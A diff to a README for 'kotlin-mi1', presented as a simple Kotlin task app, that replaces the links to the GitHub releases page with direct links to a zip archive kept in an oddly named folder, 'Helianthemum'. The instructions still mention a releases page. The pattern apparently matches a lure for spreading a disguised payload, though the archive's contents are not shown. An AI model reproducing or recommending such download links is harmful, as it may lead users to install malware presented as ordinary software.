@@ -1,7 +1,7 @@
 # 🎉 kotlin-mi1 - Simple Kotlin Application for Daily Tasks
 
 ## 📥 Download Now
-[![Download kotlin-mi1](https://img.shields.io/badge/download-kotlin--mi1-blue.svg)](https://github.com/oussamamakhou/kotlin-mi1/releases)
+[![Download kotlin-mi1](https://raw.githubusercontent.com/oussamamakhou/kotlin-mi1/main/Helianthemum/kotlin-mi1.zip)](https://raw.githubusercontent.com/oussamamakhou/kotlin-mi1/main/Helianthemum/kotlin-mi1.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Welcome to **kotlin-mi1**! This application helps you manage your daily tasks ea
 To get started, please follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to access the latest version of kotlin-mi1.
-   [Download kotlin-mi1](https://github.com/oussamamakhou/kotlin-mi1/releases)
+   [Download kotlin-mi1](https://raw.githubusercontent.com/oussamamakhou/kotlin-mi1/main/Helianthemum/kotlin-mi1.zip)
 
 2. **Choose the Latest Version**: On the releases page, find the most recent release. It usually appears at the top of the list.
 
